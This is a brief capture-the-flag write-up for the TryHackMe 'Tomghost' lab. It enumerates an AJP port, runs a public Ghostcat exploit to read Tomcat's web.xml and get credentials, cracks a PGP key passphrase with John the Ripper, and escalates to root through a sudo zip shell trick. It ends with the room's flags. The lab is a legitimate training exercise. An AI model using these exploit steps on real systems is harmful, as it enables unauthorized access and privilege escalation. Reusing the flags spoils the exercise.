# Tomghost

machine ip : `10.10.184.14`

AJP Proxy enumeration
```
nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 10.10.184.14 
```

download the exploit from github
```
https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
```
run the exploit
```
python3 Ghostcat-CNVD-2020-10487/ajpShooter.py http://10.10.184.14:8080 8009 /WEB-INF/web.xml read
```
found credentials
> skyfuck:8730281lkjlkjdqlksalks

cracking the pgp private key password
```
gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
```
decrypting the pgp file
```
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```
login as merlin
```
su merlin
```
we can see the root permitted binary 
```
sudo -l
```
exploit for zip binary
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

| Flag | Value |
|------|-------|
| User.txt | THM{GhostCat_1s_so_cr4sy} |
| Root.txt | THM{Z1P_1S_FAKE} |
